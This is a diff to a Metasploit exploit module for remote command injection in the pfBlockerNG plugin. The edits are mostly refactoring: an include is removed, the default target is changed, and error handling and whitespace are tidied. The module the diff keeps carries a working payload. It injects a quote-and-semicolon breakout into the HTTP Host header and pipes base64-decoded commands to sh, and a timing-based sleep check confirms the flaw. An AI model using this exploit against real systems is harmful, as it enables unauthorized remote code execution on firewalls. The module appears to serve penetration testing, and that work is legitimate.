@@ -10,7 +10,6 @@ class MetasploitModule < Msf::Exploit::Remote
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::CmdStager
-  include Msf::Exploit::FileDropper
   prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
@@ -70,7 +69,7 @@ class MetasploitModule < Msf::Exploit::Remote
             }
           ]
         ],
-        'DefaultTarget' => 1,
+        'DefaultTarget' => 0,
         'DefaultOptions' => {
           'RPORT' => 443,
           'SSL' => true
@@ -85,21 +84,19 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def execute_command(cmd, _opts = {})
-    begin 
-      b64 = Rex::Text.encode_base64(cmd)
-      payload = "\' * ; echo #{b64} | python3.8 -m base64 -d | sh ; \'"
+    b64 = Rex::Text.encode_base64(cmd)
+    payload = "\' * ; echo #{b64} | python3.8 -m base64 -d | sh ; \'"
 
-      return send_request_cgi({
-        'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, 'pfblockerng', 'www', 'index.php'),
-       'vhost' => payload
-      })
-      rescue StandardError => e
-        elog("#{peer} - Communication error occurred: #{e.message}", error: e)
-        return Exploit::CheckCode::Unknown("Communication error occurred: #{e.message}")
-    end
+    return send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'pfblockerng', 'www', 'index.php'),
+      'vhost' => payload
+    })
+  rescue StandardError => e
+    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
+    return Exploit::CheckCode::Unknown("Communication error occurred: #{e.message}")
   end
-  
+
   # Checking if pfBlockerNG plugin is installed and execute a randomized sleep to test
   # the remote code execution
   def check
@@ -109,10 +106,12 @@ class MetasploitModule < Msf::Exploit::Remote
     res, elapsed_time = Rex::Stopwatch.elapsed_time do
       execute_command("sleep #{sleep_time}")
     end
-    
+
     return Exploit::CheckCode::Unknown('No response received from the target!') unless res
+
     print_status("Elapsed time: #{elapsed_time} seconds.")
     return CheckCode::Safe('Failed to test command injection.') unless elapsed_time >= sleep_time
+
     CheckCode::Vulnerable('Successfully tested command injection.')
   end
 
